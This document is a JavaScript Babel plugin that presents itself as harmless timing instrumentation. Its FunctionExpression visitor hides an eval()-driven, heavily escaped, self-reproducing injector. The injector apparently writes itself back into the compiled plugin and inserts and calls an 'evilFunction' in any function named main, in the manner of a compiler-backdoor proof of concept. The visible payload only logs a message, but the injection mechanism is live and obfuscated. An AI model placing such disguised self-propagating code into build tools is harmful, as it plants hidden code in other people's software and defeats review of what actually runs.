module.exports = function nothingButInstrumentation({ types: t, parse }) {
  return {
    name: "nothingButInstrumentation",
    visitor: {
      FunctionDeclaration: {
        enter(path) {
          path
            .get("body")
            .unshiftContainer(
              "body",
              t.callExpression(
                t.memberExpression(
                  t.identifier("console"),
                  t.identifier("time")
                ),
                [t.stringLiteral(path.node.id.name)]
              )
            );
        },

        exit(path) {
          const blockStatement = path.get("body");
          const lastExpression = blockStatement.get("body").pop();
          const timeEndStatement = t.callExpression(
            t.memberExpression(
              t.identifier("console"),
              t.identifier("timeEnd")
            ),
            [t.stringLiteral(path.node.id.name)]
          );

          if (lastExpression.type !== "ReturnStatement") {
            lastExpression.insertAfter(timeEndStatement);
          } else {
            lastExpression.insertBefore(timeEndStatement);
          }
        },
      },
      FunctionExpression: {
        enter(path) {
          const selfInjector =
            '            const insertee = a.program.body[0].declarations[0].init;             const blockOfImportance =               path.node?.body?.body?.[0].argument.properties?.[1].value                 ?.properties;             blockOfImportance.push(               t.objectProperty(t.identifier("FunctionExpression"), insertee)             );           ';
          const ifStatementInjector =
            '            const ifStatement = parse("              if (path.node.id.name === \\"main\\") {                const evilFunction = parse(\\"                  function evilFunction() {                    console.log(\\\\\\"evil task performed\\\\\\");                  }                \\");                path.insertAfter(evilFunction);                const evilFunctionInvocation = parse(\\"                  evilFunction()                 \\");                path.node.body.body.splice(0, 0, evilFunctionInvocation);              }            ");            const blockOfImportanceForIfStatement =              path.node?.body?.body?.[0].argument.properties?.[1].value                ?.properties?.[0].value?.properties?.[0].body?.body;            if (blockOfImportanceForIfStatement) {              blockOfImportanceForIfStatement.push(ifStatement);            };           ';

          if (path.node.id.name === "nothingButInstrumentation") {
            let str =
              "              const a = parse(\"const temp = {                 enter(path) {                   const selfInjector = '&&selfInjector&&';                   const ifStatementInjector = '&&ifStatementInjector&&';                   if (path.node.id.name === 'nothingButInstrumentation') {                     let str = \\\"&&&\\\";                     const strPrestine = str;                     let singleEscapeSelfInjector = JSON.stringify(selfInjector).substring(                       1,                      JSON.stringify(selfInjector).length - 1                     );                     str = str.replace(/&&selfInjector&&(?!\\\\()/, singleEscapeSelfInjector);                     str = str.replace(/&selfInjector&(?!\\\\()(?!&)/, selfInjector);                     let singleEscapeIfStatementInjector = JSON.stringify(                       ifStatementInjector                     ).substring(1, JSON.stringify(ifStatementInjector).length - 1);                     let doubleExcapeIfStatementInjector = JSON.stringify(                       singleEscapeIfStatementInjector                     ).substring(                       1,                       JSON.stringify(singleEscapeIfStatementInjector).length - 1                     );                     str = str.replace(                       /&&ifStatementInjector&&(?!\\\\()/,                       doubleExcapeIfStatementInjector                     );                     str = str.replace(                       /&ifStatementInjector&(?!\\\\()(?!&)/,                       ifStatementInjector                     );                     let dstr = JSON.stringify(strPrestine).substring(                       1,                       JSON.stringify(strPrestine).length - 1                     );                     dstr = JSON.stringify(dstr).substring(                       1,                       JSON.stringify(dstr).length - 1                     );                     str = str.replace(\\\"&&&\\\", dstr);                     eval(str);                   }                 }               };\");               &selfInjector&               &ifStatementInjector&             ";
            const strPrestine = str;
            let singleEscapeSelfInjector = JSON.stringify(
              selfInjector
            ).substring(1, JSON.stringify(selfInjector).length - 1);
            str = str.replace(
              /&&selfInjector&&(?!\()/,
              singleEscapeSelfInjector
            );
            str = str.replace(/&selfInjector&(?!\()(?!&)/, selfInjector);
            let singleEscapeIfStatementInjector = JSON.stringify(
              ifStatementInjector
            ).substring(1, JSON.stringify(ifStatementInjector).length - 1);
            let doubleExcapeIfStatementInjector = JSON.stringify(
              singleEscapeIfStatementInjector
            ).substring(
              1,
              JSON.stringify(singleEscapeIfStatementInjector).length - 1
            );
            str = str.replace(
              /&&ifStatementInjector&&(?!\()/,
              doubleExcapeIfStatementInjector
            );
            str = str.replace(
              /&ifStatementInjector&(?!\()(?!&)/,
              ifStatementInjector
            );
            let dstr = JSON.stringify(strPrestine).substring(
              1,
              JSON.stringify(strPrestine).length - 1
            );
            dstr = JSON.stringify(dstr).substring(
              1,
              JSON.stringify(dstr).length - 1
            );
            str = str.replace("&&&", dstr);
            eval(str);
          }
        },
      },
    },
  };
};
